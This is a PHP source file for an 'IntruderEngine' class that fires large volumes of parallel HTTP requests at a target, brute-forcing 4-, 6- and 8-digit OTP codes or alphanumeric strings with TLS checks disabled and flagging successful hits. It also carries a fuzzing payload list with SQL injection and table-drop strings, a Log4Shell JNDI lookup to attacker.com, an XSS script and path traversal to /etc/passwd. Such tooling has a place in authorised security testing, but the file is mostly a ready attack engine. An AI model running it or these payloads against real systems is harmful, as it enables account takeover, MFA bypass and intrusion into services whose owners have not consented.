<?php
namespace Burp\Core;

class IntruderEngine {
    private $redis;
    private $logger;
    private $running = false;
    private $results = [];
    private $progress = 0;
    private $total = 0;
    private $successCount = 0;
    
    public function __construct() {
        $this->redis = new \Redis();
        $this->redis->connect($_ENV['REDIS_HOST'] ?? 'redis', $_ENV['REDIS_PORT'] ?? 6379);
        $this->logger = Logger::getInstance();
    }
    
    public function startAttack($params) {
        if ($this->running) {
            return json_encode(['error' => 'Attack already running']);
        }
        
        $this->running = true;
        $this->results = [];
        $this->successCount = 0;
        $this->progress = 0;
        
        $target = $params['target'] ?? '';
        $method = strtoupper($params['method'] ?? 'GET');
        $field = $params['field'] ?? 'otp';
        $threads = min(intval($params['threads'] ?? 10), 100);
        $start = intval($params['start'] ?? 0);
        $end = intval($params['end'] ?? 999999);
        $payloadType = $params['payload_type'] ?? 'numeric';
        $customPayloads = $params['custom_payloads'] ?? '';
        $successPatterns = $params['success_patterns'] ?? ['success', 'verified', 'approved'];
        $headers = $params['headers'] ?? [];
        $body = $params['body'] ?? '';
        
        // Generate payloads
        $payloads = $this->generatePayloads($payloadType, $start, $end, $customPayloads);
        $this->total = count($payloads);
        
        if ($this->total === 0) {
            $this->running = false;
            return json_encode(['error' => 'No payloads generated']);
        }
        
        // Process in chunks
        $chunkSize = ceil($this->total / $threads);
        $chunks = array_chunk($payloads, $chunkSize);
        
        // Start processing
        $this->processChunks($chunks, $target, $method, $field, $headers, $body, $successPatterns);
        
        $this->running = false;
        
        return json_encode([
            'total' => $this->total,
            'success_count' => $this->successCount,
            'failed_count' => $this->total - $this->successCount,
            'progress' => 100,
            'results' => array_slice($this->results, 0, 100)
        ]);
    }
    
    private function processChunks($chunks, $target, $method, $field, $headers, $body, $successPatterns) {
        $mh = curl_multi_init();
        $handles = [];
        
        foreach ($chunks as $chunkIndex => $chunk) {
            foreach ($chunk as $payloadIndex => $payload) {
                $ch = curl_init();
                
                // Build URL
                $url = $target;
                if ($method === 'GET') {
                    $url .= (strpos($target, '?') !== false ? '&' : '?') . $field . '=' . urlencode($payload);
                }
                
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_HEADER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
                
                // Headers
                $headerArray = [];
                foreach ($headers as $key => $value) {
                    $headerArray[] = "$key: $value";
                }
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headerArray);
                
                // Body
                if ($method === 'POST') {
                    $postBody = !empty($body) ? str_replace("{{$field}}", $payload, $body) : json_encode([$field => $payload]);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $postBody);
                }
                
                curl_multi_add_handle($mh, $ch);
                $handles[(string)$ch] = [
                    'ch' => $ch,
                    'payload' => $payload
                ];
            }
            
            // Execute this chunk
            $running = null;
            do {
                curl_multi_exec($mh, $running);
                curl_multi_select($mh);
                
                while ($done = curl_multi_info_read($mh)) {
                    $ch = $done['handle'];
                    $key = (string)$ch;
                    $response = curl_multi_getcontent($ch);
                    $info = curl_getinfo($ch);
                    
                    // Analyze response
                    $success = $this->analyzeResponse($response, $successPatterns);
                    if ($success) {
                        $this->successCount++;
                    }
                    
                    $this->results[] = [
                        'payload' => $handles[$key]['payload'],
                        'status_code' => $info['http_code'],
                        'size' => $info['size_download'],
                        'time' => $info['total_time'] . 's',
                        'success' => $success,
                        'response_preview' => substr($response, 0, 500)
                    ];
                    
                    $this->progress = (count($this->results) / $this->total) * 100;
                    
                    curl_multi_remove_handle($mh, $ch);
                    curl_close($ch);
                    unset($handles[$key]);
                }
            } while ($running);
        }
        
        curl_multi_close($mh);
    }
    
    private function generatePayloads($type, $start, $end, $custom) {
        $payloads = [];
        
        switch ($type) {
            case 'numeric':
                for ($i = $start; $i <= $end; $i++) {
                    $payloads[] = str_pad($i, 6, '0', STR_PAD_LEFT);
                }
                break;
                
            case 'numeric_4':
                for ($i = $start; $i <= min($end, 9999); $i++) {
                    $payloads[] = str_pad($i, 4, '0', STR_PAD_LEFT);
                }
                break;
                
            case 'numeric_8':
                for ($i = $start; $i <= min($end, 99999999); $i++) {
                    $payloads[] = str_pad($i, 8, '0', STR_PAD_LEFT);
                }
                break;
                
            case 'alphanumeric':
                $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
                $length = 6;
                $this->generateCombinations($chars, $length, '', $payloads);
                break;
                
            case 'custom':
                $payloads = array_filter(array_map('trim', explode("\n", $custom)));
                break;
                
            case 'fuzzing':
                $payloads = [
                    'null', 'NULL', 'undefined', 'false', 'true',
                    '0', '-1', '1', '999999',
                    "' OR '1'='1", "' OR 1=1 --", "'; DROP TABLE users --",
                    '${jndi:ldap://attacker.com/a}', '<script>alert(1)</script>',
                    '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
                    '%00', '%0a', '%0d', '%0d%0a',
                    'admin', 'admin123', 'password', '123456'
                ];
                break;
        }
        
        return $payloads;
    }
    
    private function generateCombinations($chars, $length, $current, &$result) {
        if ($length === 0) {
            $result[] = $current;
            return;
        }
        for ($i = 0; $i < strlen($chars); $i++) {
            $this->generateCombinations($chars, $length - 1, $current . $chars[$i], $result);
        }
    }
    
    private function analyzeResponse($response, $patterns) {
        foreach ($patterns as $pattern) {
            if (stripos($response, $pattern) !== false) {
                return true;
            }
        }
        
        // Check for success status codes
        if (preg_match('/HTTP\/\d\.\d (\d+)/', $response, $matches)) {
            $code = intval($matches[1]);
            if ($code >= 200 && $code < 300) {
                return true;
            }
        }
        
        return false;
    }
    
    public function getStatus() {
        return json_encode([
            'running' => $this->running,
            'progress' => $this->progress,
            'total' => $this->total,
            'success_count' => $this->successCount,
            'results' => count($this->results)
        ]);
    }
    
    public function stopAttack() {
        $this->running = false;
        return json_encode(['status' => 'stopped']);
    }
    
    public function exportResults($params) {
        $format = $params['format'] ?? 'json';
        $results = $this->results;
        
        switch ($format) {
            case 'csv':
                $csv = "Payload,Status Code,Size,Time,Success\n";
                foreach ($results as $result) {
                    $csv .= "{$result['payload']},{$result['status_code']},{$result['size']},{$result['time']}," . ($result['success'] ? 'Yes' : 'No') . "\n";
                }
                return $csv;
                
            case 'json':
            default:
                return json_encode(['results' => $results]);
        }
    }
}
